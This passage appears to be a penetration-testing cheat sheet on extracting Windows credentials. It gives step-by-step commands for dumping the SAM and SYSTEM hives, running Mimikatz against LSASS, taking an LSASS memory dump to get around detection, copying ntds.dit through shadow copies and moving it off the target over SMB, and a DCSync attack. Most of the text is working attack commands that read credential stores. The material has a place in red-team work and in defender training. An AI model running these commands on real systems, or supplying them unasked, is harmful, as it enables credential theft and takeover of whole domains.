### References

- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Impacket - secretsdump.py](https://github.com/SecureAuthCorp/impacket)

---
## Dumping Credentials from the Security Account Manager (SAM)

The Security Account Manager (SAM) database contains NTLM password hashes for local user accounts. However, direct access is restricted while the system is running.

### Extracting SAM and SYSTEM Files

If `SeBackupPrivilege` is enabled, the SAM and SYSTEM hives can be dumped:

```powershell
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

Once transferred to the attacker's machine, extract NTLM hashes:

```bash
pypykatz registry --sam sam system
```

This will extract NTLM hashes for all local user accounts.

---

## Dumping Credentials from LSASS

The Local Security Authority Subsystem Service (LSASS) manages Windows authentication and stores credential material, including NTLM and Kerberos tickets.

### Extracting Credentials with Mimikatz

1. Run PowerShell as Administrator.
    
2. Launch Mimikatz:
    
    ```powershell
    .\mimikatz.exe
    ```
    
3. Enable debugging privileges:
    
    ```mimikatz
    privilege::debug
    ```
    
4. Dump credentials:
    
    ```mimikatz
    sekurlsa::logonpasswords
    ```
    

This will list cached credentials, including plaintext passwords if available.

### Extracting LSASS Dump for Offline Analysis

If Mimikatz is detected, an LSASS dump can be taken for offline extraction:

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe comsvcs.dll, MiniDump 1234 C:\Temp\lsass.dmp full
```

Copy `lsass.dmp` to the attacker machine and extract credentials:

```bash
pypykatz lsa minidump lsass.dmp
```

This will parse credential material from the LSASS memory dump.

---

## Dumping NTDS.DIT for Domain Credentials

The `ntds.dit` file is the **Active Directory database** on a Domain Controller. It contains **hashed passwords** and all domain objects (users, groups, computers). To decrypt the password hashes stored inside `ntds.dit`, you also need the Windows registry hive `SYSTEM`, which contains the **BootKey** used to decrypt the hashes.

By extracting both files and using Impacket’s `secretsdump.py`, it is possible to dump all domain password hashes **offline**, without live interaction with the Domain Controller.

### Extracting NTDS.DIT via Shadow Copies

1. Create a shadow copy:
    
    ```powershell
    vssadmin create shadow /for=C:
    ```
    
2. Identify the shadow copy path:
    
    ```powershell
    vssadmin list shadows
    ```
    
3. Copy `ntds.dit`:
    
    ```powershell
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\Temp\ntds.dit
    ```
    
4. Extract the SYSTEM hive:
    
    ```powershell
    reg save hklm\system C:\Temp\system
    ```

### Extracting NTDS.DIT via File System Copy

1. Use `nxc smb` or `powershell` to copy:
```bash
copy C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

2. Transfer files to your local machine
```bash
nxc smb <target> -u user -p pass --exec "get \\C$\Temp\ntds.dit ./ntds.dit"
nxc smb <target> -u user -p pass --exec "get \\C$\Temp\SYSTEM ./SYSTEM"
```

### Extracting the Hash via `secretsdump`

Once the `ntds.dit` and `system` files have been transferred to your local machine, we can run `secretsdump` to extract credentials:

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```    

This retrieves NTLM hashes for all domain users.

---

## DCSync Attack - Dumping Domain Hashes Remotely

If an account has `Replicating Directory Changes` privileges, it can request password hashes from the DC using the DCSync attack.

### Performing a DCSync Attack with Mimikatz

Run Mimikatz on a domain-joined machine with high privileges:

```mimikatz
lsadump::dcsync /domain:corp.com /user:Administrator
```

This will return NTLM and Kerberos hashes for the target user:

```
NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

These hashes can be used for Pass-the-Hash attacks.